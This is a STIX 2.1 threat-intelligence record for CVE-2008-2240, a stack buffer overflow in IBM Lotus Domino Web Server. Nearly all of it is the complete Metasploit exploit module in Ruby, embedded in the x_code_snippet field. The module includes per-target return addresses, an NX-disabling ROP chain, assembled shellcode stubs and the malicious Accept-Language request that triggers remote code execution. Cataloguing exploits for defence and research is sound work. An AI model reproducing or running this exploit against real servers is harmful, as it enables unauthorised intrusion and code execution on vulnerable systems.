{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ddd95669-f00f-4ad7-a85e-0d39bb14b8ea",
    "created": "2024-08-14T16:47:51.023105Z",
    "modified": "2024-08-14T16:47:51.02311Z",
    "name": "IBM Lotus Domino Web Server Accept-Language Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in IBM Lotus Domino Web Server prior to version 7.0.3FP1 and 8.0.1. This flaw is triggered by any HTTP request with an Accept-Language header greater than 114 bytes. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/lotus/domino_http_accept_language.rb",
            "external_id": "domino_http_accept_language.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-2240"
        },
        {
            "source_name": "reference",
            "url": "http://www-01.ibm.com/support/docview.wss?uid=swg21303057"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t\t=> 'IBM Lotus Domino Web Server Accept-Language Stack Buffer Overflow',\n      'Description'\t\t=> %q{\n          This module exploits a stack buffer overflow in IBM Lotus Domino Web Server\n        prior to version 7.0.3FP1 and 8.0.1. This flaw is triggered by any HTTP\n        request with an Accept-Language header greater than 114 bytes.\n      },\n      'Author'\t\t=> [ 'Fairuzan Roslan <riaf[at]mysec.org>', '<Earl Marcus klks[at]mysec.org>' ],\n      'License'\t\t=> MSF_LICENSE,\n      'References'\t\t=>\n        [\n          ['CVE', '2008-2240'],\n          ['OSVDB', '45415'],\n          ['BID', '29310'],\n          ['URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21303057'],\n        ],\n      'DefaultOptions'\t=>\n        {\n          'EXITFUNC'\t=> 'thread',\n        },\n      'Privileged'\t\t=> true,\n      'Payload'\t\t=>\n        {\n          'Space'\t\t\t=> 800,\n          'BadChars'\t\t=> \"\\x00\\x0a\\x20\\x2c\\x3b\",\n          'StackAdjustment'\t=> -3500,\n        },\n      'Platform'\t\t=>\t'win',\n      'Targets'\t\t=>\n        [\n\n          ['Lotus Domino 7.0 on Windows 2003 SP1 English(NX)',\n            {\n              'FixESP'\t=> 0x70335c79, # add esp, 0x324, ret\t \t@fontmanager.dll\n              'FixESI'\t=> 0x603055da, # push esp, pop esi, ret\t\t@nnotes.dll\n              'FixEBP'\t=> 0x60a8bc90, # push esp, pop ebp, ret 0x10\t@nnotes.dll\n              'Ret'\t\t=> 0x62c838c7, # ret 0x12e\t\t\t@nlsccstr.dl\n              'DisableNX'\t=> 0x7c83e413, # NX Disable\t\t\t@ntdll.dll\n              'JmpESP'\t=> 0x62c6072e, # jmp esp\t\t\t@nlsccstr.dll\n            }\n          ],\n\n          ['Lotus Domino 7.0 on Windows 2003 SP2 English(NX)',\n            {\n              'FixESP'\t=> 0x70335c79, # add esp, 0x324, ret \t\t@fontmanager.dll\n              'FixESI'\t=> 0x603055da, # push esp, pop esi, ret\t\t@nnotes.dll\n              'FixEBP'\t=> 0x60a8bc90, # push esp, pop ebp, ret 0x10\t@nnotes.dll\n              'Ret'\t\t=> 0x62c838c7, # ret 0x12e\t\t\t@nlsccstr.dll\n              'DisableNX'\t=> 0x7c83f517, # NX Disable\t\t\t@ntdll.dll\n              'JmpESP'\t=> 0x62c6072e, # jmp esp\t\t\t@nlsccstr.dll\n            }\n          ],\n\n          ['Lotus Domino 7.0 on Windows 2003/2000/XP English(NO NX)',\n            {\n              'FixESP'\t=> 0x70335c79, # add esp, 0x324, ret \t\t@fontmanager.dll\n              'JmpESP'\t=> 0x62c6072e, # jmp esp\t\t\t@lsccstr.dll\n            }\n          ],\n\n          ['Lotus Domino 8.0 on Windows 2003 SP1 English(NX)',\n            {\n              'FixESP'\t=> 0x7ea0615c, # add esp, 0x324, ret\t\t@net.dll\n              'FixESI'\t=> 0x639a7f87, # push esp, pop esi, ret\t\t@nlsccstr.dll\n              'FixEBP'\t=> 0x6391c9f7, # push esp, pop ebp, ret 0x10\t@nlsccstr.dll\n              'Ret'\t\t=> 0x7f8b0628, # ret 0x12e\t\t\t@j9gc23.dll\n              'DisableNX'\t=> 0x7c83e413, # NX Disable\t\t\t@ntdll.dll\n              'JmpESP'\t=> 0x6391071e, # jmp esp \t\t\t@nlsccstr.dll\n            }\n          ],\n\n          ['Lotus Domino 8.0 on Windows 2003 SP2 English(NX)',\n            {\n              'FixESP'\t=> 0x7ea0615c, # add esp, 0x324, ret\t\t@net.dll\n              'FixESI'\t=> 0x639a7f87, # push esp, pop esi, ret\t\t@nlsccstr.dll\n              'FixEBP'\t=> 0x6391c9f7, # push esp, pop ebp, ret 0x10\t@nlsccstr.dll\n              'Ret'\t\t=> 0x7f8b0628, # ret 0x12e\t\t\t@j9gc23.dll\n              'DisableNX'\t=> 0x7c83f517, # NX Disable\t\t\t@ntdll.dll\n              'JmpESP'\t=> 0x6391071e, # jmp esp\t\t\t@nlsccstr.dll\n            }\n          ],\n\n          ['Lotus Domino 8.0 on Windows 2003/2000/XP English(NO NX)',\n            {\n              'FixESP'\t=> 0x7ea0615c, # add esp, 0x324, ret\t\t@net.dll\n              'JmpESP'\t=> 0x6391071e, # jmp esp\t\t\t@nlsccstr.dll\n            }\n          ],\n\n        ],\n      'DisclosureDate' => '2008-05-20'))\n  end\n\n  def exploit\n    connect\n\n    lang = rand_text_alphanumeric(116)\t\t\t\t# greetz to hateful chris\n    lang[ 56,  4 ] = [ 0xfffffffe ].pack('V')\t\t\t# Fix Second crash (esi)\n    lang[ 68,  4 ] = [ 0x7ffaf0ec ].pack('V')\t\t\t# Fix Second crash (eax)\n    lang[ 104, 4 ] = [ 0x7ffaf030 ].pack('V')\t\t\t# Fix First crash\n    lang[ 112, 4 ] = [target['FixESP']].pack('V')\t\t\t# 1\n    lang << \"\\x00\"\n    lang << payload.encoded\n\n    if(not target['DisableNX'])\n      lang[ 16, 15 ] = Metasm::Shellcode.assemble(Metasm::Ia32.new, \"add esp,-0xc4 pop edi sub edi,-0x86 call edi\").encode_string\t\t# 4\n      lang[ 80,  4 ] = [target['JmpESP']].pack('V')\t\t# 2\n      lang[ 84,  2 ] = Rex::Arch::X86.jmp_short(-0x46)\t# 3 jmp back to top\n    else\n      lang[ 16, 16 ] = Metasm::Shellcode.assemble(Metasm::Ia32.new, \"add esp,-0xd8 pop edi pop edi sub edi,-0x86 call edi\").encode_string\t# 8\n      lang[ 80,  4 ] = [target['FixESI']].pack('V')\t\t# 2\n      lang[ 84,  4 ] = [target['FixEBP']].pack('V')\t\t# 3\n      lang[ 88,  4 ] = [target['Ret']].pack('V')\t\t# 4\n      lang[ 92,  4 ] = [target['JmpESP']].pack('V')\t\t# 6\n      lang[ 100, 2 ] = Rex::Arch::X86.jmp_short(-0x56)\t# 7  jmp back to top\n      lang[ 108, 4 ] = [target['DisableNX']].pack('V')\t# 5\n    end\n\n    uri = rand_text_alpha_lower(16) + '.nsf?' + rand_text_highascii(1)\t# Trigger\n\n    print_status(\"Trying target #{target.name}...\")\n    send_request_raw({\n            'uri'\t\t\t=> \"#{uri}\",\n            'method'\t\t=> 'GET',\n            'headers'\t\t=>\n            {\n              'Accept'\t\t=> '*/*',\n              'Accept-Language'\t=> \"#{lang}\",\n              'Accept-Encoding'\t=> 'gzip,deflate',\n              'Keep-Alive'\t\t=> '300',\n              'Connection'\t\t=> 'keep-alive',\n              'User-Agent'\t\t=> 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',\n            }\n          }, 5)\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-05-20",
    "x_mitre_platforms": [
        "win'"
    ]
}